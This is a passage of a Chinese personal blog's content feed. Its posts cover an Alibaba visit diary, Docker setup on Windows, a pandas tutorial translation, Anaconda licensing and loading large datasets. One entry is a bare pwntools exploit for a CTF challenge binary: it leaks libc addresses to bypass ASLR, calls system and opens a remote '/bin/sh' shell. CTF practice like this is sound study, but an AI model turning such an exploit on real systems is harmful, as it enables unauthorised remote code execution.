日上午：阿里企业文化&emsp;&emsp;上午的主要内容是介绍阿里巴巴的企业文化。印象较为深刻的，首先是阿里的绩效考核机制，将个人价值观纳入绩效考核体系，最终的评价约莫有五种：明星，老黄牛，野狗，小白兔，狗。一方面在为这种考核机制感到惊讶，另一方面在想评价中没有“猫”是不是因为阿里在业内被称作“猫厂”hh。 &emsp;&emsp;再者是，阿里员工的培训与成长体系。平日有稍关注各大IT公司的层级分布，知道阿里的p层（技术岗）和m层（管理岗），但大多数时候有种割裂的感觉。而此次会上的所提到的，恰好成为链接各大层级的链环，从p6到p9+，从m1到m4+，这是个渐进的过程，同时需要职业技能的增长，也需要通用技能的提升，这属于阿里对关键人才的发展项目。同时阿里有为员工提供夜校，这是个成长的过程。 &emsp;&emsp;还有是，阿里员工的福利。阿里的食堂自不必说，讲一些特殊的。比如在阿里有所谓的”一年香，三年醇，五年陈”，阿里的员工每到一个阶段，都能获得相应的奖励，比如“五年陈”时候会被授予一枚戒指。这点有点类似暴雪公司的奖励机制，暴雪的员工在各个相应工作年限也能获得奖励，比如五年时会获得荣耀之剑。一方面是对员工过去几年奋斗的肯定，另一方面，我相信阿里和暴雪的员工都是激情的人，这种年长的奖励有点像打怪升级一样，这点对员工的归属感、成就感以及凝聚力的形成是很重要的。 &emsp;&emsp;当然还有一些阿里的小细节，这里稍微讲讲阿里对离职员工的做法。阿里有所谓的“校友日”，离职的员工能在规定的时间回来阿里。阿里能再对离职员工敞开大门，这是一种关怀；而离职员工愿意再踏进爱大门，这是一种情怀。毕竟很多企业很多公司的员工在离职后基本上就是与原公司一刀两断了。我想这种关怀和情怀是需要基于双方的，同时也是植根于企业文化的。 &emsp;&emsp;总体来说，管中窥豹可见一斑吧。 下午：安全联盟案例及其经验分享&emsp;&emsp;下午的内容，主要是来自联盟的博雷来分享一下关于互联网安全联盟的案例。涉及具体工作内容的这里不方便展开。但记得她说过的一句话：要干轰轰烈烈的事。有共鸣，有感触。有些时候的豪言壮语会显得假大空，不过对我自己而言，关于“要做轰轰烈烈的事”的想法却是没停过，不可否认有过各种失败，不过人要有梦想嘛，万一实现了呢。其实就我个人而言，身处于jsj系，但深感此系资源不足，挺（很）想在系里建立各种it公司互联网公司的各种学生俱乐部，像阿里学生俱乐部、微软学生俱乐部等等，虽然称不上轰轰烈烈，但至少也算是个想法，但愿日后能实现吧！在下午结束时，慈玉姐也分享了自己的传奇经历，吾等膜拜ing。 晚上：难得的技术交流&emsp;&emsp;晚上是晚宴。在每次做游戏中，我成功地输了n次罚了n杯酒hh。值得一提的是由于我偏向技术层面，慈玉姐这几天一直想让我与联盟的一些技术人员能有更多的交流，太感谢了！当天的晚宴上，（我觉得hh）慈玉姐特地把联盟的偏技术方向的霍金大哥安排在我座旁。霍金大哥原本就职于腾讯，后来阿里。在技术方面能有更多的共同话题，所以和霍金大哥一路从CTF聊到阿里云安全，从本科教育聊到职业规划，我从霍金大哥那里获得了许多的建议。 2 月 17 日&emsp;&emsp;这算是行程的最后一天，偏向于精神方向（或者说 虚hh）。早上由教官带领做做团体游戏，下午则游玩西溪湿地，略过不提，这里放张西溪湿地公园的照片。 &emsp;&emsp;等游完公园回到阿里巴巴总部，就是最终的小组pk。两天的小竞争中与另一组并列第一，但在最后的加赛中输啦。而许多高校同学在结束后离开，剩余一些同学则可以继续参与晚上的KTV活动，然后明天就各回各家啦。 小结&emsp;&emsp;总体上，此次阿里之旅，干货满满。硬技术能力固然重要，不过软能力软技能也重要，码农圈中有句话：“Talk is cheap，show me the code。”我觉得，如果单会show的话是无法把你的代码说清楚的，这还需要你的交际语言表达能力，这是软技能之一。此次前来，和联盟中人大多数的交谈是基于业务性的，是一种完全学习的态度，当然若是基于技术类的交谈，则会更像是交流。不过这是少数情况hh。同时此行中，认识了非常多的同学，在两天的小组pk中领略了他们的过人之处。 &emsp;&emsp;还有就是骗了好多赞哈哈 &emsp;&emsp;以此流水账记此次阿里之行]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址]]></title>
      <url>%2F2017%2F02%2F16%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%B9%8Bbypass-ASLR-%E5%88%A9%E7%94%A8DynELF%E6%A8%A1%E5%9D%97leak%E5%87%BA%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote('pwn2.jarvisoj.com', 9880)p = remote('218.2.197.235',20433)elf = ELF('./xmanlevel4')writeplt = elf.symbols['write']readplt = elf.symbols['read']vulnaddr = 0x804844bbssaddr = elf.bss(0x200)pppraddr = 0x8048509staraddr = 0x8048350def leak(address): payload = 'a'*140 payload += p32(writeplt) payload += p32(vulnaddr) payload += p32(1) payload += p32(address) payload += p32(4) p.send(payload) data = p.recv(4) print "%#x =&gt; %s " % (address,(data or '').encode('hex')) return datadynelf = DynELF(leak,elf=ELF('./xmanlevel4'))sysaddr = dynelf.lookup('system','libc')print "system address is " + hex(sysaddr)print "-----------------------------------"payload1 = 'a' * 140payload1 += p32(readplt)payload1 += p32(pppraddr)payload1 += p32(0)payload1 += p32(bssaddr)payload1 += p32(8)payload1 += p32(sysaddr)payload1 += p32(1)payload1 += p32(bssaddr)p.send(payload1)p.send('/bin/sh\0')p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下Docker默认存储位置修改]]></title>
      <url>%2F2017%2F02%2F14%2Fwin%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。 第一步先停掉 docker-machine,命令行中输入 docker-machine stop default 第二步在virturalbox界面同时按下 ctrl+D 调出虚拟介质管理器。 红箭头所指即为docker-machine的虚拟磁盘文件地址。点击右上角的复制，根据提示操作，为保持一致性，在选择磁盘时选择 vmdk磁盘，并选择你要作为磁盘存放路径的目录。这里我将其复制到了 D:\virtualboxVM\docker-machine\disk.vmdk 第三步返回virtualbox界面，按下 ctrl+s 跳出关于虚拟机 default 的设置界面。先移除掉原本的 disk.vmdk 再点选控制器，选择出现的两个按钮中的右边那个：添加虚拟硬盘选择“使用现有的虚拟盘”，将第二步中复制出来的硬盘文件导入。添加完成后，如下，可以发现disk的路径已经改变。 第四步重启docker，命令行中输入： docker-machine start default 即可]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[windows平台下Docker环境搭建]]></title>
      <url>%2F2017%2F02%2F13%2Fwindows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。 下载win下我们一般直接选择 Docker Toolbox 法一docker的官网：下载地址但官网下载会很慢，甚至下载了好久突然间失败hh 法二镜像站：下载地址速度快，但版本的更新问题啥的自己注意。 安装下载的exe打开，一路跟着提示走。 可以自己选择安装位置,但要记住。后面要用到。这里为 D:\Docker Toolbox 注意需要安装virtualbox，因为我们是在win平台下安装docker，而docker是高度依赖linux的，所以这里需要virtualbox（开源免费）来提供win平台下linux内核的接口与特性 需要安装git for windows，若原本机子中已经有了，可以勾掉不选择。 kitematic是docker的GUI工具，也顺便安了吧。不过一般咱都是用命令行的嘛。 耐心等待安装过程结束 初次启动安装完成后，桌面上会多出三个图标 Oracle VM VirtualBox Kitematic (Alpha) Docker Quickstart Terminal 这里我们只需要先打开（双击）第三个。第一次运行时，黑屏幕上只有光标，可能需要先打一个回车。一般情况下如下： 可能等很久都没有反应，我说的是 “可能”hh注意到里面的意思是要把 boot2docker 下载下来，记住下载路径： C:\Users\ASUS\.docker\machine\cache 打开dokcer的安装路径（以我的安装路径为例）D:\Docker Toolbox将里面的 boot2docker.iso 拷贝到 下载路径里 回到桌面运行 Docker Quickstart Terminal，可能需要再按一次回车 等“安装”完成，控制台会出现： 完成后最好重启一下这样就行啦。 可能的问题初始化问题解决方法：将 virtualbox 和 docker 卸载掉，重启，再重新安装 Terminal一直自动关闭解决方法：重启电脑……]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（5）ten Minutes to pandas中文版下]]></title>
      <url>%2F2017%2F02%2F02%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B%2F</url>
      <content type="text"><![CDATA[此文是 ten-Minutes-to-pandas 下半部分的翻译。上半部分请看：《数据挖掘比赛（4）ten Minutes to pandas中文版上》紧接上文的数据，如下：以下下半部分正文开始： 操作（Operations）更多内容请看：《Basic section on Binary Ops》 统计（Stats）通常情况下，这些操作的对象不包括缺失值 描述性统计信息1df.mean() 指定轴向在其他轴上执行相同操作1df.mean(1) 自动对应维度对具有不同维度和需要对齐的对象操作时，pandas会自动地沿着特定的维度进行广播（注：其实就是运算啦）123# 准备工作s = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2)s （注：.shift操作会对数据进行移动，空出的位置用nan代替） 1df.sub(s, axis='index') （注： .sub 表示 减去 ） 函数应用（Apply）把函数应用到数据上 使用已有函数1df.apply(np.cumsum) （注：np.cumsum的使用方法） 使用匿名函数1df.apply(lambda x: x.max() - x.min()) （注：lambda表达式，建议百度） 直方图（Histogramming）更多内容请查阅 《Histogramming and Discretization》123# 准备工作s = pd.Series(np.random.randint(0, 7, size=10))s 1s.value_counts() （注：Histogramming翻译过来是叫直方图。这里value_counts返回的数据中说明了 5 出现了 3 次， 2 出现了 2 次等等，虽无图形，但实际上却是是直方图的表示） 字符串方法（String Methods）Series对象的 str属性 中集成了一系列用于处理字符串的方法，如下代码所示，能够很方便对对象中的每个元素进行处理。注意到，通常情况下在 str属性中的 模式匹配（pattern-matching）默认使用了 正则表达式（regular expressions）。更多内容请查阅 《Vectorized String Methods》 123# 准备工作s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat'])s 12# .loewr() 转换成小写字母s.str.lower() 数据合并（Merge）就合并类操作（join / merge-type operations）而言，pandas提供了各种工具能方便地对Series，DataFrame，和 Panel对象 进行各种逻辑演算来进行数据合并 。更多内容请查阅《Merging section》（注：上面这段话在原文中放在concat的开头，为逻辑和结构上的完整和流畅，我这里放到了这边） Concat用 concat() 把pandas对象联系（Concatenating）起来123# 准备工作df = pd.DataFrame(np.random.randn(10, 4))df 123# 准备工作2：把刚刚生成的df分片（break it into pieces）pieces = [df[:3], df[3:7], df[7:]]pieces 12# 使用concat()连接pd.concat(pieces) JoinSQL形式的连接。更多内容请查阅《Database style joining》 示例一123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'rval': [4, 5]&#125;)right 12# 使用 merge() 连接pd.merge(left, right, on='key') 示例二另一个例子如下：123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'rval': [4, 5]&#125;)right 1pd.merge(left, right, on='key') Append向 dataframe对象添加行。更多内容请查阅 《Appending》 123# 准备工作1df = pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D'])df 123# 准备工作2s = df.iloc[3]s 12# 使用 appenddf.append(s, ignore_index=True) 分组（Grouping）对分组操作，我们指的是包含以一个或多个步骤的过程： 根据某些标准把数据切分（Splitting）成不同组别 给每个组别独立地应用（Applying）函数 将结果组合（Combining）成同一数据结构 更多内容请查看 《Grouping section》 12345678# 准备工作df = pd.DataFrame(&#123;'A' : ['foo', 'bar', 'foo', 'bar', ....: 'foo', 'bar', 'foo', 'foo'], ....: 'B' : ['one', 'one', 'two', 'three', ....: 'two', 'two', 'one', 'three'], ....: 'C' : np.random.randn(8), ....: 'D' : np.random.randn(8)&#125;)df 一列分组，然后对各个分组结果应用函数（sum）1df.groupby('A').sum() 多列根据多列分组，形成层次索引，从而可以对其使用函数。1df.groupby(['A','B']).sum() 数据重组（Reshaping）更多内容请查看 《Hierarchical Indexing》 和 《Reshaping》 Stack123456789# 准备工作tuples = list(zip(*[['bar', 'bar', 'baz', 'baz', ....: 'foo', 'foo', 'qux', 'qux'], ....: ['one', 'two', 'one', 'two', ....: 'one', 'two', 'one', 'two']]))index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second'])df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B'])df2 = df[:4]df2 12stacked = df2.stack()stacked 对于一个 “stacked” 的 DataFrame 或者 Series 对象 （它们的索引是层次索引），stack（）操作的逆操作是 unstack（），它默认情况下只处理末级层次的索引。 1stacked.unstack() 1stacked.unstack(1) 1stacked.unstack(0) 数据透视表（Pivot Tables）更多内容请查阅 Pivot Tables 1234567# 准备工作df = pd.DataFrame(&#123;'A' : ['one', 'one', 'two', 'three'] * 3, .....: 'B' : ['A', 'B', 'C'] * 4, .....: 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, .....: 'D' : np.random.randn(12), .....: 'E' : np.random.randn(12)&#125;)df 我们可以很简便地从数据中得到数据透视表1pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) 时间序列（Time Series）在频率转换重采样时，pandas具有简单强大有效的作用（比如说，把秒级采样的数据转换成 5分钟级别的数据）。这在金融领域非常常见，当然也不仅局限于此。更多内容请查阅 《Time Series section》 时分秒1234# 准备工作rng = pd.date_range('1/1/2012', periods=100, freq='S')ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng)ts （注：上图只截取了一部分的数据） 12# 转换ts.resample('5Min').sum() 时区时区表示1234# 准备工作rng = pd.date_range('3/6/2012 00:00', periods=5, freq='D')ts = pd.Series(np.random.randn(len(rng)), rng)ts 12ts_utc = ts.tz_localize('UTC')ts_utc 时区转换1ts_utc.tz_convert('US/Eastern') 时期转换（period）123rng = pd.date_range('1/1/2012', periods=5, freq='M')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 12ps = ts.to_period()ps 时间戳转换（timestamp）1ps.to_timestamp() 函数应用在 时期（period）和时间戳（timestamp）转换时有一些方便的算术函数可以使用。在下面的例子中，我们把以季度为频率的数据转换成以季度末月为频率的数据。123prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV')ts = pd.Series(np.random.randn(len(prng)), prng)ts 12ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9ts.head() 分类型数据（categorical）从 0.15版本开始，pandas的dataframe对象开始支持分类性数据（categorical data）。更多内容请查阅 《categorical introduction》 和 《API documentation》12df = pd.DataFrame(&#123;"id":[1,2,3,4,5,6], "raw_grade":['a', 'b', 'b', 'a', 'a', 'e']&#125;)df 转换将原始grade数据转换成分类型数据12df["grade"] = df["raw_grade"].astype("category")df["grade"] 重命名给分类型数据重命名为更有意义的名字。（通过 Series.cat.categories 来指派位置）12df["grade"].cat.categories = ["very good", "good", "very bad"]df 数据修整给分类型数据重排序，同时填补缺失值。（默认情况下， Series.cat 方法会返回一个新的Series类型 ）12df["grade"] = df["grade"].cat.set_categories(["very bad", "bad", "medium", "good", "very good"])df["grade"] 排序问题给分类型排序是按照 categories 的顺序，而不是按照字典顺序1df.sort_values(by="grade") 归类按照分类列来数据归类时，空的类别也会显示出来。1df.groupby("grade").size() 作图（Plotting）更多内容请看《Plotting》 基本画图1234# 数据ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))ts = ts.cumsum()ts 12# 作图ts.plot() dataframe作图在dataframe对象里，plot（）可以很方便地画出所有有标签的列。1234df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, .....: columns=['A', 'B', 'C', 'D'])df = df.cumsum()plt.figure(); df.plot(); plt.legend(loc='best') 数据读写（Getting Data In/Out）CSV写入把数据写进 CSV文件。更多内容请查阅 《Writing to a csv file》1df.to_csv('foo.csv') 读出将数据从 csv文件 中读出。更多内容请查阅 《Reading from a csv file》1pd.read_csv('foo.csv') HDF5更多内容请看 《HDFStores》 写入1df.to_hdf('foo.h5','df') 读出1pd.read_hdf('foo.h5','df') Excel更多内容请看 《MS Excel》 写入1df.to_excel('foo.xlsx', sheet_name='Sheet1') 读出1pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) 陷阱（Gotchas）如果你试着做这样的操作，你会得到如下信息。 更多信心请查看 《Comparisons》 和 《Gotchas》]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（4）ten Minutes to pandas中文版上]]></title>
      <url>%2F2017%2F02%2F01%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A%2F</url>
      <content type="text"><![CDATA[pandas官方文档中有一份快速入门教程《ten Minutes to pandas》，虽然网上早有其中文翻译，不过可能是旧版的：）所以闲来无事，自己也翻译最新版本的学习一下。 这里示例部分都由代码和运行结果图片组成，读者可以直接复制代码来运行；同时为了更清晰，加入了一些小结构标题，所以在小细节处跟官方文档略有不同。本机的运行环境是Python 3.5.2 |Anaconda 4.2.0 (64-bit) ，pandas库的版本为0.19.2，使用jupyter noterbook作为交互环境，对照的这份文档版本为 0.19.2 。这篇文章是对 ten-Minutes-to-pandas的上半部分的翻译。以下正文开始： 总说这是一份主要面向新手的对pandas库的简要介绍。想了解更多，你可以通过阅读Cookbook通常，我们像下面这样导入：123import pandas as pdimport numpy as npimport matplotlib.pylot as plt 创建对象（Object Creadtion）可以通过查看Data Structure Intro section来获取关于这节的更多内容 创建Series我们可以通过传递列表（list）来创建 Series，pandas会自动为其生成默认整数索引。12s = pd.Series([1,3,5,np.nan,6,8])s 创建DataFrame传递数组我们可通过传递数组对象（numpy array），时间索引（datetime index）、列标签（labeled columns）来创建 DataFrame12dates = pd.date_range('20130101',periods=6)dates 12df = pd.DataFrame(np.random.randn(6,4),index=dates,columns=list('ABCD'))df 传递字典我们可以通过传递一个能被转换成类似序列（Serise-like）的字典对象（dict）来创建 DataFrame 1234567df2 = pd.DataFrame(&#123; 'A' : 1.,....: 'B' : pd.Timestamp('20130102'),....: 'C' : pd.Series(1,index=list(range(4)),dtype='float32'),....: 'D' : np.array([3] * 4,dtype='int32'),....: 'E' : pd.Categorical(["test","train","test","train"]),....: 'F' : 'foo' &#125;)df2 它们的列有不同的数据类型1df2.dtypes IPython如果你使用 IPython ，那么tab键能自动补全 列名（column names）和 属性（ public attributes）。下面是能被自动补全的属性的一个子集：1df2. （注：如上图红箭头处按 tab键 ） 你可以看到，列名 A 等会被自动补齐……（原文：As you can see, the columns A, B, C, and D are automatically tab completed. E is there as well; the rest of the attributes have been truncated for brevity。 因为没有做和原文相似的图，所以这句只好：）不翻译了hh ） 查看数据（Viewing Data）查看 Basics section 获得关于这节的更多内容。 查看frame中的头部和尾部部分的行1df.head() 1df.tail() 显示索引、列名、底层numpy数据（the underlying numpy data）1df.index 1df.columns 1df.values （注：这个values，应该就是把df中的数据直接以numpy array的形式打印出来，注意与前面的 df 命令图片对比一下） 对数据进行快速简单统计1df.describe() (注：count：计数，多少个hh；mean：平均数；std：方差；min：最小值；25%：分位数； 50%：分位数，中位数；75%：分位数；max：最大值) 转置（Transposing）1df.T 排序按轴排序（Sorting by an axis）1df.sort_index(axis=1, ascending=True) （注：axis=1表明按照column来排序，关于axis的讨论参见 Stackoverflow:What does axis in pandas mean?；ascending=False说明要用降序排序，其默认值True代表升序） 按值排序（Sorting by values）1df.sort_values(by='B') （注：这里没有传入或没有显式指定ascending参数，则其默认值为True，为升序排列。） 选择（Selection）尽管python/numpy的关于选择（selecting ）和设定（setting）的表达式能直接（intuitive）在交互式环境（interactive work）中派上用场，但在实际工作中，我们推荐使用经过优化（optimized）的pandas方法：.at, .iat, .loc, .iloc 和 .ix. 想了解更多请查阅：《Indexing and Selecting Data》和《MultiIndex/Advanced Indexing》 获取数据（Getting）获取列选择单独的一列，返回一个 Series 对象，相当于 df.A1df['A'] （注：这里附上 df.A 的结果：） 获取行通过 [ ] 对行进行选取，这操作会对行进行切片（slice） 1df[0:3] 1df['20130102':'20130104'] 通过标签选择（Selection by Label）—— .loc（注：由于写这篇时间过长，jupyter notebook中前面的代码要重新运行一遍，而前面的示例中使用了random函数产生的随机值，所以重新运行后下面的数据会跟上面的数据不太一样，这里放上重新运行后 df值 的图，以作为对照。） 想了解关于本节更多内容请查看 Selection by Label 通过标签获得交叉区域（cross section）1df.loc[dates[0]] 通过标签进行多轴选择（multi-axis）1df.loc[:,['A','B']] 标签切片，两端确定1df.loc['20130102':'20130104',['A','B']] 缩减返回对象的维度1df.loc['20130102',['A','B']] 获取标量值1df.loc[dates[0],'A'] 快速获取标量值结果与前面一个方法相同1df.at[dates[0],'A'] （注：.loc和 .at运行时间对比如下：） 通过位置选择（Selection by Position）—— .iloc想了解本节更多内容请查看 Selection by Position 通过传入整数来选择1df.iloc[3] 数值切片，跟numpy/python类似1df.iloc[3:5,0:2] 传入指定位置（整数）的列表，与numpy/python类似1df.iloc[[1,2,4],[0,2]] 对行切片（slicing rows）1df.iloc[1:3,:] 对列切片（slicing columns）1df.iloc[:,1:3] 取值（标量值）1df.iloc[1,1] 更快取值（标量值）1df.iat[1,1] （注：以下是 .iloc 和 .iat 的时间比较。） 通过布尔表达式进行索引（Boolean Indexing）使用单独一列来选择数据1df[df.A &gt; 0] 使用 where 操作来选择数据1df[df &gt; 0] （注：虽然没有出现where，但这个确实是where操作） 使用 isin() 方法来过滤数据1234# 准备工作df2 = df.copy()df2['E'] = ['one', 'one','two','three','four','three']df2 12# 使用isin()df2[df2['E'].isin(['two','four'])] 设置（Setting）设置新的列，使其数据自动按索引排列123# 准备工作s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20130102', periods=6))s1 123# 设置新的列df['F'] = s1df 通过标签（label）来设置数值1df.at[dates[0],'A'] = 0 通过位置（position）来设置数值1df.iat[0,1] = 0 通过指定numpy数组来设置数值1df.loc[:,'D'] = np.array([5] * len(df)) 经过前面一堆操作后的结果： 通过 where 操作来设置数值123df2 = df.copy()df2[df2 &gt; 0] = -df2df2 处理缺失值（Missing Data）pandas主要用值 np.nan 来表示缺失值。默认情况下，它不会参与计算。更多内容查看 Missing Data section 重索引（Reindexing）重索引能让你对特定的轴（axis）来进行索引的改变/添加/删除。它会返回一个复制值（注：也就是说不会改变原本的数据）。123df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E'])df1.loc[dates[0]:dates[1],'E'] = 1df1 删除所有具有缺失值的行（dropna）1df1.dropna(how='any') 填充缺失值（fillna）1df1.fillna(value=5) 缺失值的布尔表达式（isnull）1pd.isnull(df1) 剩余内容请看：数据挖掘比赛（5）ten Minutes to pandas中文版下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（3）申请anaconda-academic-license并使用]]></title>
      <url>%2F2017%2F01%2F29%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[Anaconda是python的一个科学计算发行版，里面集成了各种各样的科学计算包，如numpy、pandas、sklearn等。作为学生，在使用anaconda发行版的同时，我们可以申请anaconda的学术证书，通过它可以下载一些额外的包以实现计算过程的加速。 注册、申请、下载注册地址：https://anaconda.org/ 其中的email要用学校邮箱，否则不能申请成功。我的邮箱是 **@stu.xmu.edu.cn 在注册完了后，先点右上角的头像处，再选择My Setting 如下： 选择add ons 将右边的三个license下载下来：MKL Optimizations、IOPro、Anaconda Accelerate。 安装先打开命令行，输入如下命令（注，我这里以windows下为例），确定license的安装位置。 conda info --license 如图 （注：ASUS即用户的主文件夹，各位根据自己的电脑调整） 然后将下载的3个license（即txt文件）放到 .continuum 文件夹里面。这里注意下，如果打开个人文件夹(这里即ASUS文件夹)没看到 .continuum ，那要记得勾选一下显示隐藏文件。如果还不存在，那需要自己创建 .continuum 文件夹。如下： 然后打开命令行，分别输入 conda install accelerate conda install iopro 注意，是分别输入，而且在安装accelerate时为满足dependency会同时安装mkl，所以就不单独输入conda install mkl了。比如安装 accelerate 模块，如下： 跟着提示来，下载过程可能有点慢：） 测试使用以accelerate为例，从add ons页面中可以看出acelerate的作用是： Fast Python for GPUs and multi-core with NumbaPro and MKL Optimizations. 在安装accelerate后我们可以利用GPU显卡来加速计算过程。不过查了官方文档搜了stackoverflow翻遍了google和百度都没有找到单独关于acclerate库的使用，大多数的讨论集中于在安装后对numba的使用，所以这里用numba来测试一下加快了多少。在测试前我把显卡的驱动升级了下，接下来确定一下机子的显卡是否支持。命令行打开，输入：123import numba.cuda.api,numba.cuda.cudadrv.libsnumba.cuda.cudadrv.libs.test()numba.cuda.api.detect() 第一行导入库，第二行用来检测库的安装正确，第三行用来确定显卡是否支持加速。 下面是测试代码（网上找的稍微修改了下，自己还写不出来）：1234567891011121314151617181920212223242526272829303132333435import numpy as npfrom numba import jitnobs = 1000000def proc_numpy(x,y,z): x = x*2 - ( y * 55 ) # these 4 lines represent use cases y = x + y*2 # where the processing time is mostly z = x + y + 99 # a function of, say, 50 to 200 lines z = z * ( z - .88 ) # of fairly simple numerical operations return z@jitdef proc_numba(xx,yy,zz): for j in range(nobs): # as pointed out by Llopis, this for loop x, y = xx[j], yy[j] # is not needed here. it is here by # accident because in the original benchmarks x = x*2 - ( y * 55 ) # I was doing data creation inside the function y = x + y*2 # instead of passing it in as an array z = x + y + 99 # in any case, this redundant code seems to z = z * ( z - .88 ) # have something to do with the code running # faster. without the redundant code, the zz[j] = z # numba and numpy functions are exactly the same. return zzx = np.random.randn(nobs)y = np.random.randn(nobs)z = np.zeros(nobs)res_numpy = proc_numpy(x,y,z)z = np.zeros(nobs)res_numba = proc_numba(x,y,z)%timeit proc_numpy(x,y,z)%timeit proc_numba(x,y,z) 结果如图,第一行是用cpu计算的时间，2.06ms；第二行是gpu计算的时间 121μs；就本例而言快了17倍左右。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（2）利用pandas读取大型数据集]]></title>
      <url>%2F2017%2F01%2F25%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86%2F</url>
      <content type="text"><![CDATA[数据比赛中，有时提供的数据集会很大，常规方法打不开，这时候就需要在读入时做些小处理，方便后续操作。 读入以IJCAI-17比赛数据集中的user_pay.txt 和 user_view.txt 为例，user_pay.txt有 2.13Gb 之大，而user_view.txt 只有 174Mb 。两者的读入方法见下。 对于 user_view.txt 这种较小型的数据 ，直接读入即可。如下：123import pandas as pduser_view_db = pd.read_table('user_view.txt',header=None,sep=',')user_view_db.head() 但对于如 2.13Gb大的 user_pay.txt 的大型数据，如果直接读入，会让硬盘和内存飙满且速度非常慢（机子好的童鞋请忽略—）。对此，采取的策略是分块读入。在用 read_table 读入时指定 chunksize 参数和 iterator参数，如下：1user_pay_db = pd.read_table('user_pay.txt',header=None,sep=',',iterator=True,chunksize=10000) (注：chunksize等于多少可以自己选定，iterator=True好像一般都这么设定：）至于why在stackoverflow上有相关问题但似乎没有满意的答案) 可以看到多了两个参数后，user_pay_db 不再是dataframe了，而是pandas.io.parsers.TextFileReader。想要查看它可以如下：12for chunk in user_pay_db: print(chunk) 它会按照 chunksize 的大小打印出内容，如下: （由于数据集过大，只截取部分内容） 处理接下来的处理有两种，一是可以直接对 user_pay_db 中的每个 chunk 进行分块处理，也可以想办法把 此时为TextFileReader的 user_pay_db 转化为易于操作的 dataframe格式。这里只演示第二种方法。 我们可以借助 pandas 中的concat方法来合并数据集。如下：1df = pd.concat([chunk for chunk in user_pay_db],ignore_index=True) 这里用变量df来存储。我们给concat传了两个参数，第一个是利用了for循环，注意不要忽略了中括号；第二个参数用于告诉concat连接时忽略掉每个chunk中原有的index，否则等连接完后，会出现同一个index对应了多个项的情况，如下： 小结（题外话）上面的代码是基于 Anaconda 4.2.0 (64-bit)集成包的。其pandas版本为0.18.1，而最新的pandas版本为0.19，其中的一些函数的使用方法做了更新，比如concat。希望读者在上述代码运行不了不对的情况下能查查文档留留言一起讨论：） 下面附上pandas的文档地址 pandas 0.18.1 文档 pandas 0.19.2 文档 不清楚自己pandas版本的，见下,其中version前后都是两个下划线__： 欢迎留言：）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（1）对无列名的txt数据集读取方法及处理]]></title>
